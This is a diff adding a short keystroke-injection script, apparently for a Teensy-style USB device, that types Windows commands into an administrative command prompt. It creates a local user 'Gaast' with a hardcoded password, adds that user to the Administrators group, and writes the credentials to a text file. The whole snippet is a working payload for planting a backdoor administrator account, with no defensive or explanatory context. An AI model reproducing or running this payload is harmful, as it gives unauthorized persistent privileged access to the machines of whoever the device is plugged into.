@@ -1,0 +1,13 @@
+﻿// ############################
+// Creates an local admin account
+// Only Administrative CMD
+// ############################
+
+Keyboard.print ("net user Gaast Peensy3.5! /add");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("net localgroup Administrators Gaast /add");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
+
+Keyboard.print ("echo user Gaast Peensy3.5! >> AdminAccount.txt");
+Keyboard.set_key1(KEY_ENTER);Keyboard.send_now();unpress_key();
